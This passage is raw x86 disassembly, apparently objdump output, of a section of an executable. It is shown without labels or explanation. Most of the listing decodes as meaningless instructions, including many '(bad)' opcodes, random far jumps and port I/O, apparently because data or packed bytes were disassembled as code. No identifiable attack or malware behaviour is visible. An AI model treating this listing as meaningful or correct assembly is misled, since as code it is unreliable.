  402065:	and    edi,DWORD PTR [edi-0x6f]
  402068:	push   edx
  402069:	sub    bh,ch
  40206b:	pop    esp
  40206c:	jmp    0x402013
  40206e:	xchg   esi,eax
  40206f:	(bad)  
  402070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402071:	cwde   
  402072:	cmp    edi,esi
  402074:	xor    eax,0xf8df1705
  402079:	pop    esp
  40207a:	enter  0xe31b,0x2d
  40207e:	xchg   esp,ebx
  402080:	jmp    0x4020fd
  402082:	dec    ebp
  402083:	add    DWORD PTR [ebp+0x6924f059],esp
  402089:	and    eax,0x3a
  40208c:	out    dx,al
  40208d:	cli    
  40208e:	test   DWORD PTR [edx-0x3889196],0x66e99dac
  402098:	in     al,0x77
  40209a:	xchg   ebx,eax
  40209b:	cmp    eax,0x75ba84d8
  4020a0:	retf   0x1471
  4020a3:	dec    ebx
  4020a4:	clc    
  4020a5:	xchg   ebp,eax
  4020a6:	fistp  DWORD PTR [edx]
  4020a8:	adc    al,0x5d
  4020aa:	add    BYTE PTR [ecx+0x31],0x22
  4020ae:	pop    esi
  4020af:	(bad)  
  4020b0:	sub    DWORD PTR [ecx],ebp
  4020b2:	fimul  WORD PTR [edi-0x17fc479b]
  4020b8:	xchg   DWORD PTR [ebx],ebx
  4020ba:	mov    ecx,0x6adfba05
  4020bf:	or     BYTE PTR [ebp-0x60e8f084],bl
  4020c5:	mov    ebp,0x7bca0171
  4020ca:	bound  esi,QWORD PTR [eax-0x70cd7011]
  4020d0:	adc    eax,0x59d6a345
  4020d5:	mov    DWORD PTR [ecx-0x40],0x567c4d6c
  4020dc:	push   es
  4020dd:	mov    edi,DWORD PTR [edx+esi*8]
  4020e0:	rcr    dh,0x51
  4020e3:	mov    eax,ds:0x9e82c5e4
  4020e8:	(bad)  
  4020e9:	and    BYTE PTR [edi],al
  4020eb:	dec    ebx
  4020ec:	loope  0x4020a1
  4020ee:	sbb    bl,ch
  4020f0:	sbb    ch,ah
  4020f2:	or     ebx,ebx
  4020f4:	ins    BYTE PTR es:[edi],dx
  4020f5:	shl    BYTE PTR [ebx+0x63],cl
  4020f8:	and    al,0x11
  4020fa:	and    BYTE PTR [edx],ch
  4020fc:	xchg   ecx,eax
  4020fd:	and    al,0x1a
  4020ff:	mov    cl,0x6
  402101:	fistp  DWORD PTR [esi-0x929f4ad]
  402107:	mov    bl,0x13
  402109:	mov    cs,eax
  40210b:	mov    eax,ds:0x46b791b1
  402110:	leave  
  402111:	pop    ds
  402112:	xchg   esi,eax
  402113:	mov    BYTE PTR [esi+0x56],bl
  402116:	or     bl,BYTE PTR [edi-0x52]
  402119:	jg     0x4020d7
  40211b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40211c:	mov    cl,0x73
  40211e:	push   ecx
  40211f:	sbb    DWORD PTR [edx-0x6],0x2c5ff717
  402126:	gs adc esp,ebp
  402129:	xchg   edi,eax
  40212a:	sar    BYTE PTR [ebx],0xed
  40212d:	scas   al,BYTE PTR es:[edi]
  40212e:	sbb    DWORD PTR [edi],0xb17e254a
  402134:	aam    0xf
  402136:	(bad)  
  402137:	repnz adc al,bh
  40213a:	adc    eax,0x6c7d3c1d
  40213f:	mov    ds,WORD PTR [ebx+0x6e]
  402142:	sar    bh,1
  402144:	mov    al,0xd9
  402146:	mov    edx,0x1757f79a
  40214b:	pop    ebx
  40214c:	sbb    al,0x1a
  40214e:	or     BYTE PTR [eax-0x7c],bl
  402151:	adc    bh,dh
  402153:	or     bl,BYTE PTR [ebp+0x63ca8933]
  402159:	stos   DWORD PTR es:[edi],eax
  40215a:	rcr    DWORD PTR [edx-0x17960161],cl
  402160:	aas    
  402161:	pop    eax
  402162:	cmp    DWORD PTR [edi+ebp*1],esp
  402165:	loope  0x402101
  402167:	and    al,BYTE PTR [eax+eax*1]
  40216a:	xchg   ecx,eax
  40216b:	mov    DWORD PTR [ebx+0x4e],esp
  40216e:	push   es
  40216f:	repz jge 0x402185
  402172:	call   0xcd71:0xf7c4dc27
  402179:	jns    0x4021cf
  40217b:	mul    BYTE PTR [edx+0x72b05496]
  402181:	dec    eax
  402182:	mov    ds:0x9635375d,al
  402187:	iret   
  402188:	ftst   
  40218a:	shl    eax,1
  40218c:	cli    
  40218d:	push   es
  40218e:	imul   ebx,DWORD PTR [ecx-0x32],0xfec1349d
  402195:	and    DWORD PTR [eax-0x57],ebx
  402198:	jb     0x4021b4
  40219a:	lahf   
  40219b:	add    eax,0xca2dc7
  4021a0:	icebp  
  4021a1:	jle    0x402166
  4021a3:	leave  
  4021a4:	cs push eax
  4021a6:	fstp   TBYTE PTR [eax-0x16]
  4021a9:	mov    ecx,0xa116fa03
  4021ae:	dec    edi
  4021af:	xchg   edx,eax
  4021b0:	adc    DWORD PTR [esi+eax*2+0x263304da],esi
  4021b7:	add    al,0x97
  4021b9:	jmp    0x961b:0x3dd3a657
  4021c0:	or     BYTE PTR [ecx],cl
  4021c2:	test   BYTE PTR [esi+0x13],0x1e
  4021c6:	mov    eax,?
  4021c8:	jge    0x4021e4
  4021ca:	rcr    BYTE PTR [esp+eax*8],0x9
  4021ce:	and    esi,ebx
  4021d0:	jno    0x402160
  4021d2:	rcl    eax,0x27
  4021d5:	dec    esp
  4021d6:	xlat   BYTE PTR ds:[ebx]
  4021d7:	leave  
  4021d8:	rol    dh,1
  4021da:	xlat   BYTE PTR ds:[ebx]
  4021db:	adc    ebx,esi
  4021dd:	jnp    0x40217b
  4021df:	pusha  
  4021e0:	clc    
  4021e1:	ret    
  4021e2:	mov    edx,0xf7dfd58a
  4021e7:	inc    esi
  4021e8:	push   ecx
  4021e9:	(bad)  
  4021ea:	out    0xe4,al
  4021ec:	leave  
  4021ed:	push   edi
  4021ee:	cmp    ebp,DWORD PTR ds:0x866a14e2
  4021f4:	jno    0x402268
  4021f6:	jmp    0x40226a
  4021f8:	fcom   QWORD PTR [ecx]
  4021fa:	push   esi
  4021fb:	sub    eax,0xb7ac096d
  402200:	pop    esi
  402201:	dec    esi
  402202:	out    dx,eax
  402203:	pop    ebx
  402204:	mov    eax,0x80ba682
  402209:	adc    DWORD PTR [ecx+0x23],eax
  40220c:	adc    bh,BYTE PTR [esi]
  40220e:	push   ss
  40220f:	adc    al,0xcf
  402211:	xor    al,0xb0
  402213:	or     bl,cl
  402215:	call   0xc1fd0e6b
  40221a:	int3   
  40221b:	sub    al,BYTE PTR [ebx+ecx*1-0x1b]
  40221f:	inc    ecx
  402220:	adc    dx,bp
  402223:	dec    ecx
  402224:	repnz ins DWORD PTR es:[edi],dx
  402226:	push   edx
  402227:	stc    
  402228:	sub    esi,esp
  40222a:	clc    
  40222b:	mov    ds:0xd77e7d5c,eax
  402230:	adc    eax,0xad1b2f5e
  402235:	fisub  DWORD PTR [edx]
  402237:	mov    al,BYTE PTR [eax-0x177baf82]
  40223d:	push   0x2f
  40223f:	dec    ebx
  402240:	cld    
  402241:	popa   
  402242:	loopne 0x4022a6
  402244:	cmp    eax,0x132023d0
  402249:	addr16 inc esp
  40224b:	push   edi
  40224c:	fxtract 
  40224e:	ror    BYTE PTR [ebx-0x39ccf3b3],0x8d
  402255:	test   BYTE PTR [eax],al
  402257:	call   0x2bce:0x33003272
  40225e:	enter  0x8b66,0x45
  402262:	cld    
  402263:	movzx  eax,ax
  402266:	cmp    eax,ecx
  402268:	mov    eax,DWORD PTR [ebp+0x10]
  40226b:	movzx  ecx,WORD PTR [ebp-0x4]
  40226f:	jg     0x40258a
  402275:	xor    eax,esi
  402277:	sub    ecx,eax
  402279:	sub    ecx,edi
  40227b:	mov    WORD PTR [ebp-0x4],cx
  40227f:	jmp    0x402597
  402284:	jmp    0x40258a
  402289:	pop    edi
  40228a:	pop    eax
  40228b:	dec    edx
  40228c:	pop    es
  40228d:	push   ebp
  40228e:	xor    DWORD PTR [ebp+0x60],edi
  402291:	push   es
  402292:	sti    
  402293:	rcr    DWORD PTR [esi+0x25b57a93],1
  402299:	add    DWORD PTR [edx],0x7c
  40229c:	jl     0x402305
  40229e:	jle    0x40231c
  4022a0:	jl     0x40227e
  4022a2:	xchg   edi,eax
  4022a3:	hlt    
  4022a4:	pop    esp
  4022a5:	xchg   ecx,eax
  4022a6:	pushf  
  4022a7:	adc    cl,bl
  4022a9:	jg     0x40228d
  4022ab:	shl    DWORD PTR [edx],1
  4022ad:	fwait
  4022ae:	fs mov edx,0x840e7553
  4022b4:	dec    ebx
  4022b5:	(bad)
  4022b9:	out    dx,eax
  4022ba:	push   eax
  4022bb:	mov    edx,0x5936f592
  4022c0:	hlt    
  4022c1:	out    0xf,al
  4022c3:	ja     0x402335
  4022c5:	test   al,0x64
  4022c7:	jge    0x4022c1
  4022c9:	pop    es
  4022ca:	dec    esp
  4022cb:	imul   ebp,DWORD PTR [ebx],0x7
  4022ce:	cmp    eax,0xc68343e2
  4022d3:	ficom  DWORD PTR [ebx]
  4022d5:	adc    DWORD PTR ds:0x1f456b2,ebp
  4022db:	hlt    
  4022dc:	add    DWORD PTR [eax-0x283ac3ec],ebp
  4022e2:	leave  
  4022e3:	aas    
  4022e4:	xchg   ebp,eax
  4022e5:	call   0xd7f2:0x40dc4554
  4022ec:	test   eax,0x9a5fd
  4022f1:	push   ebp
  4022f2:	jge    0x402293
  4022f4:	adc    BYTE PTR [edi-0x1733e26b],bl
  4022fa:	inc    esi
  4022fb:	mov    eax,ebp
  4022fd:	pop    ds
  4022fe:	jp     0x40235b
  402300:	cmp    ecx,DWORD PTR [edx]
  402302:	adc    esi,DWORD PTR [ebx-0x68]
  402305:	mov    al,0x79
  402307:	xlat   BYTE PTR ds:[bx]
  402309:	repnz add eax,0x9a8a92cc
  40230f:	mov    ecx,DWORD PTR [eax-0x1da87ec6]
  402315:	jmp    0xed3b:0x1ed69636
  40231c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40231d:	xor    ch,dh
  40231f:	(bad)  
  402320:	lods   al,BYTE PTR ds:[esi]
  402321:	jge    0x402343
  402323:	out    dx,al
  402324:	jge    0x4022e1
  402326:	mov    cl,0x97
  402328:	or     dl,dl
  40232a:	jns    0x402381
  40232c:	mov    edi,0x45db85a8
  402331:	xor    BYTE PTR [eax],bh
  402333:	or     DWORD PTR [ebx],esp
  402335:	and    al,0x77
  402337:	push   ebp
  402338:	dec    edi
  402339:	in     al,0x15
  40233b:	cmp    esp,DWORD PTR [edi]
  40233d:	cmc    
  40233e:	cmp    eax,0xdd9b5a70
  402343:	mov    DWORD PTR [ebx+0x6e],edx
  402346:	push   esp
  402347:	add    al,0x65
  402349:	push   ebx
  40234a:	sub    esi,DWORD PTR [ebx+0x43]
  40234d:	dec    ebp
  40234e:	pop    es
  40234f:	leave  
  402350:	or     edx,DWORD PTR [ebx+ecx*2-0x28]
  402354:	pop    eax
  402355:	xor    bh,BYTE PTR [esi+edx*2-0x63]
  402359:	mov    ds:0x74c2da6f,eax
  40235e:	data16 je 0x402384
  402361:	div    BYTE PTR [esi]
  402363:	xlat   BYTE PTR ds:[ebx]
  402364:	jecxz  0x402301
  402366:	sub    ebp,ecx
  402368:	xlat   BYTE PTR ds:[ebx]
  402369:	cld    
  40236a:	mov    eax,ds:0xef344115
  40236f:	mov    ebp,0x7d826113
  402374:	das    
  402375:	test   DWORD PTR ds:0x79d7d92f,ebx
  40237b:	enter  0xf353,0xae
  40237f:	jb     0x40235b
  402381:	jmp    0xb313:0x7f9c9e6a
  402388:	add    dh,0x8d
  40238b:	push   ebx
  40238c:	add    DWORD PTR [ebp+0x59e0dd48],esi
  402392:	into   
  402393:	lock les eax,FWORD PTR [ebx]
  402396:	sahf   
  402397:	xor    DWORD PTR [eax-0x33],edx
  40239a:	ror    DWORD PTR es:[eax-0x1],cl
  40239e:	jo     0x402374
  4023a0:	sub    DWORD PTR [esi],esi
  4023a2:	inc    ebp
  4023a3:	loop   0x40233f
  4023a5:	fwait
  4023a6:	jmp    0xeb77efa4
  4023ab:	test   al,0x27
  4023ad:	jb     0x4023b7
  4023af:	mov    eax,0x72157731
  4023b4:	push   ebp
  4023b5:	dec    esp
  4023b6:	outs   dx,BYTE PTR ds:[esi]
  4023b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023b8:	stos   DWORD PTR es:[edi],eax
  4023b9:	fucom  st(1)
  4023bb:	inc    ebp
  4023bc:	int    0x59
  4023be:	lods   eax,DWORD PTR ds:[esi]
  4023bf:	rol    bh,1
  4023c1:	mov    edx,0xcefd3dcc
  4023c6:	ins    DWORD PTR es:[edi],dx
  4023c7:	inc    edi
  4023c8:	jb     0x4023ad
  4023ca:	add    al,0xb
  4023cc:	inc    eax
  4023cd:	jecxz  0x40242e
  4023cf:	shl    DWORD PTR [ebp-0x55],0x65
  4023d3:	xor    al,0xe6
  4023d5:	push   esi
  4023d6:	icebp  
  4023d7:	shr    ch,cl
  4023d9:	mov    dh,0x8e
  4023db:	pop    esi
  4023dc:	popf   
  4023dd:	ins    BYTE PTR es:[edi],dx
  4023de:	xor    al,0xf6
  4023e0:	mov    bh,0xe5
  4023e2:	in     al,0x63
  4023e4:	ins    DWORD PTR es:[edi],dx
  4023e5:	lea    edx,[edi-0x15]
  4023e8:	pop    eax
  4023e9:	jmp    0xb346:0x1786bd3c
  4023f0:	push   ss
  4023f1:	scas   eax,DWORD PTR es:[edi]
  4023f2:	idiv   DWORD PTR [eax+ecx*1+0x0]
  4023f6:	xor    eax,esi
  4023f8:	aad    0xef
  4023fa:	mov    es,WORD PTR [edx+0x16]
  4023fd:	es xor al,0xbf
  402400:	bswap  edi
  402402:	arpl   WORD PTR [edi-0x4494aae6],cx
  402408:	daa    
  402409:	sbb    ch,0x4c
  40240c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40240d:	jp     0x4023b5
  40240f:	scas   eax,DWORD PTR es:[edi]
  402410:	push   esi
  402411:	jmp    0x4023ca
  402413:	dec    ebp
  402414:	gs dec edx
  402416:	pusha  
  402417:	add    al,0x7c
  402419:	pusha  
  40241a:	xlat   BYTE PTR ds:[ebx]
  40241b:	mov    bl,0xf
  40241d:	push   ebx
  40241e:	mov    ah,ch
  402420:	or     ecx,DWORD PTR [ecx]
  402422:	cmp    BYTE PTR [esi],0x6d
  402425:	mov    al,BYTE PTR [eax+edi*8-0x63958882]
  40242c:	sbb    DWORD PTR [ebx+0x3],eax
  40242f:	fisubr WORD PTR [ebp+edx*1+0x243fb341]
  402436:	adc    al,0x5e
  402438:	sbb    bh,BYTE PTR [eax]
  40243a:	stos   DWORD PTR es:[edi],eax
  40243b:	dec    ebp
  40243c:	dec    edx
  40243d:	ret    0x1634
  402440:	and    cl,BYTE PTR [edi]
  402442:	or     eax,0x46952a8
  402447:	pop    ds
  402448:	and    eax,0xc6d41cb1
  40244d:	pop    esp
  40244e:	or     dh,BYTE PTR [ebp+ebp*2+0x71]
  402452:	test   al,0x9
  402454:	test   BYTE PTR [ebp-0x23],0x6
  402458:	pop    edi
  402459:	cmp    DWORD PTR cs:[eax-0x67],ebp
  40245d:	pop    ss
  40245e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40245f:	xor    DWORD PTR fs:[esi+0x14],edi
  402463:	rcr    cl,0xe5
  402466:	js     0x402456
  402468:	dec    edx
  402469:	ds loope 0x4024a6
  40246c:	or     ebp,DWORD PTR [eax-0x5]
  40246f:	xchg   ebx,eax
  402470:	imul   edx,esp,0x4af85315
  402476:	xor    al,0xbe
  402478:	(bad)  
  402479:	xchg   di,ax
  40247b:	or     DWORD PTR [ebp+0xd],ecx
  40247e:	xchg   ecx,eax
  40247f:	pop    es
  402480:	xchg   ebx,eax
  402481:	(bad)  
  402482:	test   BYTE PTR [esi-0x67818310],0x2d
  402489:	sbb    DWORD PTR [ebx+0x4073375d],eax
  40248f:	sbb    edi,DWORD PTR [ebp-0x4e624191]
  402495:	mov    edx,0x9b7dfd16
  40249a:	lods   eax,DWORD PTR ds:[esi]
  40249b:	cmp    BYTE PTR [edx],dh
  40249d:	scas   al,BYTE PTR es:[edi]
  40249e:	outs   dx,DWORD PTR ds:[esi]
  40249f:	add    al,0xd6
  4024a1:	jle    0x4024c7
  4024a3:	add    eax,DWORD PTR [edi-0x22]
  4024a6:	or     cl,ch
  4024a8:	(bad)  
  4024a9:	jecxz  0x402437
  4024ab:	adc    dl,dh
  4024ad:	ret    
  4024ae:	pop    ebx
  4024af:	test   DWORD PTR [esi],0x88e0a27a
  4024b5:	imul   ebp,edx,0xc01ec090
  4024bb:	retf   
  4024bc:	xor    BYTE PTR [edi],bl
  4024be:	jge    0x4024b6
  4024c0:	adc    dl,cl
  4024c2:	aaa    
  4024c3:	inc    ebx
  4024c4:	jecxz  0x402448
  4024c6:	pop    esp
  4024c7:	adc    bh,BYTE PTR [edi-0x11]
  4024ca:	mov    ds:0x528247e6,eax
  4024cf:	xchg   ebp,eax
  4024d0:	jno    0x40254d
  4024d2:	jmp    0x2d32dd53
  4024d7:	or     BYTE PTR [ebp-0x11],cl
  4024da:	mov    ds:0x23600786,eax
  4024df:	cmp    al,0xf
  4024e1:	retf   
  4024e2:	sbb    DWORD PTR [edx+0x32da3763],ecx
  4024e8:	mov    DWORD PTR [ebp-0x6a],esi
  4024eb:	(bad)  
  4024ed:	jne    0x402563
  4024ef:	mov    dh,0x15
  4024f1:	retf   
  4024f2:	xchg   DWORD PTR [edi-0x51],edi
  4024f5:	push   ds
  4024f6:	test   BYTE PTR [ebx+esi*4-0x57c9835c],al
  4024fd:	rcr    DWORD PTR [edx],cl
  4024ff:	or     DWORD PTR [edx-0x65],esp
  402502:	add    BYTE PTR [esi-0x5fa2c7a9],0x79
  402509:	push   edx
  40250a:	jbe    0x40253a
  40250c:	loop   0x402526
  40250e:	bound  esp,QWORD PTR [ecx-0x20a237e6]
  402514:	pop    ecx
  402515:	xor    ebp,DWORD PTR [esi]
  402517:	enter  0xf519,0x3
  40251b:	push   ebx
  40251c:	xchg   esp,eax
  40251d:	sbb    al,0x9a
  40251f:	in     al,0x5a
  402521:	(bad)  
  402522:	sbb    al,0xae
  402524:	push   esp
  402525:	and    eax,0x6ae253c0
  40252a:	cmp    cl,BYTE PTR [esi]
  40252c:	fiadd  DWORD PTR [ecx+0x30]
  40252f:	outs   dx,BYTE PTR ds:[esi]
  402530:	dec    esp
  402531:	jg     0x4024c7
  402533:	adc    eax,0xca0ea90b
  402538:	aad    0x82
  40253a:	push   esp
  40253b:	shl    DWORD PTR ds:0x6bfeaca0,0x80
  402542:	lods   eax,DWORD PTR ds:[esi]
  402543:	cmp    eax,0xdc22bd84
  402548:	(bad)  
  402549:	(bad)  
  40254a:	ror    BYTE PTR [ebx],cl
  40254c:	inc    esp
  40254d:	push   edx
  40254e:	xor    bh,dh
  402550:	fdiv   DWORD PTR [edx+0x178051ba]
  402556:	mov    ebx,DWORD PTR ss:[edx+ebx*4+0x4f]
  40255b:	xor    BYTE PTR [eax+0x18efd7ac],0x19
  402562:	nop
  402563:	mov    ds:0xe7b6c426,al
  402568:	test   eax,0x8c473316
  40256d:	in     eax,dx
  40256e:	sub    ebx,edx
  402570:	out    dx,al
  402571:	push   esp
  402572:	pop    esp
  402573:	mov    ds:0xb55607bb,al
  402578:	pop    es
  402579:	dec    ebx
  40257a:	ss add esp,ebx
  40257d:	and    DWORD PTR [ebx-0x5e],edi
  402580:	fwait
  402581:	xchg   esi,eax
  402582:	pop    ebx
  402583:	imul   esp,DWORD PTR [ecx-0x76e8a28],0xffffff9a
  40258a:	xor    eax,esi
  40258c:	lea    eax,[eax+ecx*1+0x32729a]
  402593:	mov    WORD PTR [ebp-0x4],ax
  402597:	mov    eax,DWORD PTR [ebp-0xc]
  40259a:	cmp    eax,ebx
  40259c:	jmp    0x4028a2
  4025a1:	mov    cs,WORD PTR [edx-0x1e6f1870]
  4025a7:	jne    0x402626
  4025a9:	adc    BYTE PTR [eax-0x26],0xee
  4025ad:	cdq    
  4025ae:	aad    0x89
  4025b0:	aaa    
  4025b1:	jmp    0x7c7e:0x677c7c0f
  4025b8:	jl     0x402550
  4025ba:	and    eax,0xdc7f3c68
  4025bf:	retf   
  4025c0:	inc    edx
  4025c1:	xor    cl,BYTE PTR [edx+edi*1+0x0]
  4025c5:	in     eax,0xb8
  4025c7:	dec    eax
  4025c8:	pandn  mm2,QWORD PTR [eax]
  4025cb:	mov    dl,0x61
  4025cd:	(bad)  
  4025ce:	(bad)  [ebx+0x8a50da9]
  4025d4:	push   ss
  4025d5:	pop    edx
  4025d6:	bound  ebp,QWORD PTR [ebp+0x6d]
  4025d9:	test   BYTE PTR [edi],bl
  4025db:	(bad)  
  4025dc:	adc    DWORD PTR [eax+0xb15b0fd],esi
  4025e2:	imul   eax,DWORD PTR [ebx+0x58],0xb7bbd1b1
  4025e9:	lods   al,BYTE PTR ds:[esi]
  4025ea:	hlt    
  4025eb:	mov    al,ds:0x14cbda27
  4025f0:	fcomp  DWORD PTR [esi+0x2a]
  4025f3:	cmc    
  4025f4:	dec    eax
  4025f5:	stos   DWORD PTR es:[edi],eax
  4025f6:	outs   dx,BYTE PTR ds:[esi]
  4025f7:	inc    edx
  4025f8:	fbstp  TBYTE PTR [ebx+0x2bdb8f59]
  4025fe:	in     al,0xdf
  402600:	sahf   
  402601:	sub    ebx,edi
  402603:	inc    ebx
  402604:	jle    0x402664
  402606:	out    dx,eax
  402607:	imul   ebx,DWORD PTR [esi+0x43],0x93ab7739
  40260e:	adc    BYTE PTR [edi-0x7a],0x6
  402612:	loop   0x4025b9
  402614:	pusha  
  402615:	push   0x4b
  402617:	inc    ebp
  402618:	add    BYTE PTR [edx],al
  40261a:	or     eax,0x16773bb0
  40261f:	aaa    
  402620:	dec    edi
  402621:	xchg   ecx,eax
  402622:	push   es
  402623:	add    ebx,esi
  402625:	pushf  
  402626:	jne    0x4025e4
  402628:	push   esp
  402629:	aam    0x64
  40262b:	mov    edx,DWORD PTR [edi-0x19b067c2]
  402631:	inc    esi
  402632:	fdivr  DWORD PTR [ecx]
  402634:	mov    cl,0xfd
  402636:	pop    ds
  402637:	sar    BYTE PTR [ecx+0x4c03cb78],cl
  40263d:	bound  ecx,QWORD PTR [ebp-0x2f]
  402640:	jecxz  0x40261e
  402642:	add    al,0x81
  402644:	pop    ss
  402645:	push   esi
  402646:	and    DWORD PTR [eax+0x44],0x65
  40264a:	or     edx,DWORD PTR [ebx-0xa]
  40264d:	or     BYTE PTR [ebx-0x6a651d09],dh
  402653:	push   0x36bd2836
  402658:	loope  0x402664
  40265a:	ins    DWORD PTR es:[edi],dx
  40265b:	das    
  40265c:	xor    esp,DWORD PTR [edi+0x5c]
  40265f:	scas   al,BYTE PTR es:[edi]
  402660:	xor    al,0x93
  402662:	lods   eax,DWORD PTR ds:[esi]
  402663:	sub    DWORD PTR [esi-0x21],0xffcbffdf
  40266a:	(bad)  
  40266b:	mov    edx,0x5cd857d4
  402670:	out    0x76,eax
  402672:	nop
  402673:	adc    eax,0xeb5bf179
  402678:	inc    edx
  402679:	int    0xdc
  40267b:	stos   DWORD PTR es:[edi],eax
  40267c:	pop    eax
  40267d:	xchg   edi,eax
  40267e:	jne    0x402660
  402680:	mov    dl,0x65
  402682:	out    dx,eax
  402683:	mov    ecx,0xbad89352
  402688:	cdq    
  402689:	fnstenv [ebx+0x68]
  40268c:	dec    esi
  40268d:	seta   BYTE PTR [ebx-0x6a79eb93]
  402694:	and    dh,BYTE PTR [ecx-0x6e]
  402697:	inc    esi
  402698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402699:	ss dec eax
  40269b:	xchg   ecx,eax
  40269c:	sbb    eax,0xdbccde70
  4026a1:	loop   0x4026e8
  4026a3:	repz fisttp DWORD PTR [ebx-0x21]
  4026a7:	xchg   ebx,eax
  4026a8:	adc    ah,0x10
  4026ab:	mov    edx,0x30b95d98
  4026b0:	sbb    eax,0x16139b9a
  4026b5:	(bad)  
  4026b6:	push   ss
  4026b7:	xor    al,0x35
  4026b9:	fsubr  QWORD PTR [edx+0x47]
  4026bc:	mov    BYTE PTR [eax],0x5d
  4026bf:	fisttp WORD PTR [edi]
  4026c1:	add    al,0xed
  4026c3:	pop    ebp
  4026c4:	xchg   edi,eax
  4026c5:	add    al,0x7a
  4026c7:	aam    0xc6
  4026c9:	and    bl,ah
  4026cb:	repz mov edi,0xdf31f734
  4026d1:	pop    ebx
  4026d2:	push   es
  4026d3:	or     al,0x7a
  4026d5:	in     eax,dx
  4026d6:	sub    cl,ch
  4026d8:	push   ebp
  4026d9:	sar    BYTE PTR [edx-0xdb297b3],cl
  4026df:	xor    eax,0x991ed163
  4026e4:	outs   dx,DWORD PTR ds:[esi]
  4026e5:	xor    DWORD PTR [edx-0x5a7fd338],0x2d
  4026ec:	xor    BYTE PTR [ebx+ebx*1-0x1d],bh
  4026f0:	cmc    
  4026f1:	nop
  4026f2:	hlt    
  4026f3:	(bad)
  4026f6:	dec    esi
  4026f7:	cli    
  4026f8:	xor    al,0x40
  4026fa:	lds    edi,FWORD PTR [edi+0x72]
  4026fd:	cld    
  4026fe:	bound  esi,QWORD PTR ds:0xca5b7403
  402704:	dec    esi
  402705:	psrld  mm0,QWORD PTR [ebp-0x6d]
  402709:	jno    0x4026a3
  40270b:	ror    BYTE PTR [esi-0xa4f065a],cl
  402711:	push   0x22bbee
  402716:	in     al,0x3c
  402718:	push   esp
  402719:	xor    al,0xbe
  40271b:	xor    eax,DWORD PTR [ebx]
  40271d:	push   cs
  40271e:	ins    DWORD PTR es:[edi],dx
  40271f:	int    0x70
  402721:	(bad)  
  402722:	fdiv   DWORD PTR [ecx+0x59]
  402725:	cmp    BYTE PTR [eax+0x50],0x60
  402729:	and    DWORD PTR [eax],ebp
  40272b:	shl    ah,cl
  40272d:	xor    DWORD PTR [edx+0x10],esi
  402730:	fs call 0x89c7:0x9e6e8efd
  402738:	pop    eax
  402739:	jnp    0x4027b5
  40273b:	inc    edx
  40273c:	push   ebp
  40273d:	retf   
  40273e:	outs   dx,BYTE PTR ds:[esi]
  40273f:	mov    bl,0x9a
  402741:	repz (bad) 
  402743:	addr16 cmp al,0x71
  402746:	or     ecx,DWORD PTR [ecx]
  402748:	jmp    0x402771
  40274a:	mov    ds:0xfe77a257,al
  40274f:	scas   al,BYTE PTR es:[edi]
  402750:	aam    0x39
  402752:	adc    eax,0x11149c24
  402757:	adc    eax,0x5899c51b
  40275c:	xor    eax,0xaf1f1ff5
  402761:	pop    ds
  402762:	icebp  
  402763:	jecxz  0x402763
  402765:	jmp    DWORD PTR [eax+0x6348ed31]
  40276b:	shr    DWORD PTR [eax-0xd8b1955],1
  402771:	push   esp
  402772:	idiv   DWORD PTR [esi+0x30]
  402775:	xchg   edi,eax
  402776:	jle    0x402704
  402778:	push   ds
  402779:	pop    esp
  40277a:	std    
  40277b:	mov    dl,0xd
  40277d:	or     al,0xa
  40277f:	xchg   esi,eax
  402780:	in     eax,0x2a
  402782:	es enter 0x35ba,0x40
  402787:	mov    edx,0xff7c5cb8
  40278c:	pop    ds
  40278d:	jp     0x4027f0
  40278f:	or     edx,DWORD PTR [edx]
  402791:	inc    edx
  402792:	mov    al,ds:0xbae5ae59
  402797:	dec    edi
  402798:	push   es
  402799:	xchg   ebp,eax
  40279a:	ins    BYTE PTR es:[edi],dx
  40279b:	outs   dx,DWORD PTR ds:[esi]
  40279c:	or     al,0xd1
  40279e:	aaa    
  40279f:	idiv   ch
  4027a1:	loope  0x402818
  4027a3:	adc    BYTE PTR [edx],cl
  4027a5:	inc    eax
  4027a6:	inc    ecx
  4027a7:	test   DWORD PTR [esi+eax*2+0x5f342567],eax
  4027ae:	add    cl,dl
  4027b0:	mov    esi,0x6f2205c6
  4027b5:	xor    ch,BYTE PTR ds:0xf4393d54
  4027bb:	in     eax,0xd9
  4027bd:	pusha  
  4027be:	adc    al,0x90
  4027c0:	inc    eax
  4027c1:	xchg   DWORD PTR [esi-0x6b],ecx
  4027c4:	push   edx
  4027c5:	in     al,0x6d
  4027c7:	cli    
  4027c8:	dec    edi
  4027c9:	scas   al,BYTE PTR es:[edi]
  4027ca:	cwde   
  4027cb:	out    dx,eax
  4027cc:	clc    
  4027cd:	push   eax
  4027ce:	xchg   edx,eax
  4027cf:	mov    bl,0x69
  4027d1:	xchg   esi,eax
  4027d2:	xor    ebp,ecx
  4027d4:	or     edi,DWORD PTR [ebx-0x53]
  4027d7:	ficom  DWORD PTR ds:0x493ae875
  4027dd:	xlat   BYTE PTR ds:[ebx]
  4027de:	nop
  4027df:	mov    ecx,edi
  4027e1:	mov    ebx,eax
  4027e3:	fnstcw WORD PTR [ecx-0x35e2a858]
  4027e9:	ret    0x41bc
  4027ec:	pop    ecx
  4027ed:	jns    0x4027d7
  4027ef:	and    bl,BYTE PTR [ebx-0x2f]
  4027f2:	sbb    eax,DWORD PTR [ecx]
  4027f4:	pop    ebp
  4027f5:	jle    0x4027de
  4027f7:	div    DWORD PTR [ebx]
  4027f9:	or     DWORD PTR [ebx+ebx*8-0x77d41107],eax
  402800:	mov    bh,0xc0
  402802:	les    edi,FWORD PTR [ebx]
  402804:	adc    DWORD PTR [ecx],esp
  402806:	sub    eax,0xb8fc4bf5
  40280b:	add    ebp,edi
  40280d:	xchg   ebp,eax
  40280e:	and    eax,0x5909f926
  402813:	inc    edi
  402814:	fwait
  402815:	pop    es
  402816:	and    edx,DWORD PTR [edx+0x2ff8ce85]
  40281c:	inc    ecx
  40281d:	imul   esp,DWORD PTR [ecx+0x490599fd],0x7d
  402824:	add    edi,DWORD PTR [edx-0x4d52b1ba]
  40282a:	mov    esp,DWORD PTR [esi+0x50]
  40282d:	test   al,0x20
  40282f:	jp     0x402870
  402831:	cli    
